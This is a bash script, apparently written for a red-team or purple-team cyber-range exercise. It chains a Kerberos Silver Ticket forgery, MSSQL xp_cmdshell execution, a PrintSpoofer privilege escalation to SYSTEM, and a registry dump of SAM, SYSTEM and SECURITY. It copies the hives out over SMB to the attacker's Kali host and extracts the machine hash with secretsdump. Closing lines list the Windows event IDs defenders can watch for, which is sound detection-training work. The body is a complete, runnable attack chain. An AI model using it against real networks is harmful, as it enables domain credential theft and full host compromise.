#!/bin/bash
# ============================================================
# TTP4: Silver Ticket Forgery + MSSQL xp_cmdshell + PrintSpoofer
# MITRE: T1558.002 — Steal or Forge Kerberos Tickets: Silver Ticket
# MITRE: T1134 — Access Token Manipulation (SeImpersonate)
# APT29 Ref: Capability inference — Kerberos ticket forgery
# ============================================================
# PURPOSE: Generates Event 4624 on SRV07-SQL with NO matching
#          Event 4769 on DC02 (Silver Ticket signature). Event
#          4688 for PrintSpoofer and reg.exe process creation.
# RUN FROM: Kali (attacker machine)
# PREREQ: svc_sql hash from TTP3, Domain SID from TTP3
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
PRIVESC="$TOOLS/tools"
SRV07="SRV07-SQL.$DOMAIN"
SVC_SQL_HASH="${1:?Usage: $0 <SVC_SQL_HASH> <DOMAIN_SID> <DC_IP>}"
DOMAIN_SID="${2:?Usage: $0 <SVC_SQL_HASH> <DOMAIN_SID> <DC_IP>}"
DCIP="${3:?Usage: $0 <SVC_SQL_HASH> <DOMAIN_SID> <DC_IP>}"
KALI_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | grep -v '127.0.0.1' | head -1)

echo "[*] TTP4: Silver Ticket + MSSQL PrivEsc — T1558.002 / T1134"
echo "[*] Target: $SRV07"
echo "[*] Kali IP: $KALI_IP"
echo ""

# Sync clock
dc_time=$(nmap -p 445 --script smb2-time "$DCIP" 2>/dev/null | grep "date:" | grep -oP '\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}' | head -1)
[ -n "$dc_time" ] && sudo date -s "$dc_time" &>/dev/null && echo "[+] Clock synced: $dc_time"

cd "$TOOLS"
rm -f *.ccache 2>/dev/null
unset KRB5CCNAME

echo ""
echo "[*] Phase 1: Forging Silver Ticket for MSSQLSvc..."
echo "[*] This ticket is validated by SRV07-SQL directly — DC02 never sees it"
echo ""

impacket-ticketer -nthash "$SVC_SQL_HASH" \
  -domain-sid "$DOMAIN_SID" \
  -domain "$DOMAIN" \
  -spn "MSSQLSvc/${SRV07}:1433" \
  -dc-ip "$DCIP" Administrator 2>&1 | tee "$LOOT/ttp4_silver_ticket.txt"

if [ -f "Administrator.ccache" ]; then
    export KRB5CCNAME="Administrator.ccache"
    echo "[+] Silver Ticket set"
else
    echo "[-] Silver Ticket failed. Falling back to hash auth..."
fi

sleep 2

echo ""
echo "[*] Phase 2: Connecting to MSSQL..."
echo ""

# Determine auth method
MSSQL_AUTH=""
if [ -f "Administrator.ccache" ]; then
    MSSQL_AUTH="-k -no-pass '$DOMAIN/Administrator@$SRV07' -windows-auth"
else
    MSSQL_AUTH="'$DOMAIN/svc_sql@$SRV07' -hashes ':$SVC_SQL_HASH' -windows-auth"
fi

cat > "$TOOLS/ttp4_recon.sql" << 'SQL'
SELECT @@version;
SELECT name FROM sys.databases;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'hostname';
SQL

eval impacket-mssqlclient $MSSQL_AUTH -file "$TOOLS/ttp4_recon.sql" 2>&1 | tee "$LOOT/ttp4_sql_recon.txt"
sleep 2

echo ""
echo "[*] Phase 3: Uploading PrintSpoofer via xp_cmdshell + SMB..."
echo ""

# Start SMB server
pkill -f impacket-smbserver 2>/dev/null; sleep 1
impacket-smbserver -smb2support -username att -password att share "$PRIVESC/" &>/dev/null &
SMB_PID=$!
sleep 3

cat > "$TOOLS/ttp4_upload.sql" << SQLU
EXEC xp_cmdshell 'net use \\\\${KALI_IP}\\share /user:att att';
EXEC xp_cmdshell 'copy \\\\${KALI_IP}\\share\\PrintSpoofer64.exe C:\\Windows\\Temp\\PrintSpoofer64.exe /Y';
EXEC xp_cmdshell 'net use \\\\${KALI_IP}\\share /delete /y';
EXEC xp_cmdshell 'dir C:\\Windows\\Temp\\PrintSpoofer64.exe';
SQLU

eval impacket-mssqlclient $MSSQL_AUTH -file "$TOOLS/ttp4_upload.sql" 2>&1 | tee "$LOOT/ttp4_upload.txt"
sleep 2

echo ""
echo "[*] Phase 4: PrintSpoofer → SYSTEM → registry hive dump..."
echo ""

cat > "$TOOLS/ttp4_privesc.sql" << 'SQLP'
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "whoami"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c reg save HKLM\SAM C:\Windows\Temp\sam.save /y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c reg save HKLM\SYSTEM C:\Windows\Temp\system.save /y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c reg save HKLM\SECURITY C:\Windows\Temp\security.save /y"';
SQLP

eval impacket-mssqlclient $MSSQL_AUTH -file "$TOOLS/ttp4_privesc.sql" 2>&1 | tee "$LOOT/ttp4_privesc.txt"
sleep 3

echo ""
echo "[*] Phase 5: Exfiltrating hives via SMB..."
echo ""

kill $SMB_PID 2>/dev/null; sleep 1
mkdir -p "$LOOT/hives" 2>/dev/null
impacket-smbserver -smb2support -username att -password att share "$LOOT/hives/" &>/dev/null &
SMB_PID=$!
sleep 3

cat > "$TOOLS/ttp4_exfil.sql" << SQLE
EXEC xp_cmdshell 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "cmd /c net use \\\\${KALI_IP}\\share /user:att att"';
EXEC xp_cmdshell 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "cmd /c copy C:\\Windows\\Temp\\sam.save \\\\${KALI_IP}\\share\\sam.save /Y"';
EXEC xp_cmdshell 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "cmd /c copy C:\\Windows\\Temp\\system.save \\\\${KALI_IP}\\share\\system.save /Y"';
EXEC xp_cmdshell 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "cmd /c copy C:\\Windows\\Temp\\security.save \\\\${KALI_IP}\\share\\security.save /Y"';
EXEC xp_cmdshell 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "cmd /c net use \\\\${KALI_IP}\\share /delete /y"';
SQLE

eval impacket-mssqlclient $MSSQL_AUTH -file "$TOOLS/ttp4_exfil.sql" 2>&1 | tee "$LOOT/ttp4_exfil.txt"
kill $SMB_PID 2>/dev/null

echo ""
echo "[*] Phase 6: Parsing hives offline..."
echo ""

if [ -f "$LOOT/hives/sam.save" ] && [ -f "$LOOT/hives/system.save" ]; then
    impacket-secretsdump -sam "$LOOT/hives/sam.save" \
      -system "$LOOT/hives/system.save" \
      -security "$LOOT/hives/security.save" LOCAL 2>&1 | tee "$LOOT/ttp4_hive_dump.txt"

    MACHINE_HASH=$(grep -a 'MACHINE.ACC:' "$LOOT/ttp4_hive_dump.txt" | grep -v 'plain_password_hex' | tail -1 | grep -oP '[a-f0-9]{32}' | tail -1)
    [ -n "$MACHINE_HASH" ] && echo "[+] SRV07-SQL\$ machine hash: $MACHINE_HASH" && echo "$MACHINE_HASH" > "$LOOT/ttp4_machine_hash.txt"
else
    echo "[-] Hive files not found."
fi

echo ""
echo "[+] TTP4 Complete."
echo "[+] Blue team: check SRV07-SQL Security log for:"
echo "    - Event 4624 Type 3 — Administrator logon (Silver Ticket)"
echo "    - CRITICAL: NO Event 4769 on DC02 for this logon — Silver Ticket bypass"
echo "    - Event 4688 — PrintSpoofer64.exe process creation"
echo "    - Event 4688 — reg.exe save commands (hive dump)"
echo "[+] Blue team: check SQL Server audit for xp_cmdshell execution"
echo "[+] Artifacts: $LOOT/ttp4_*"
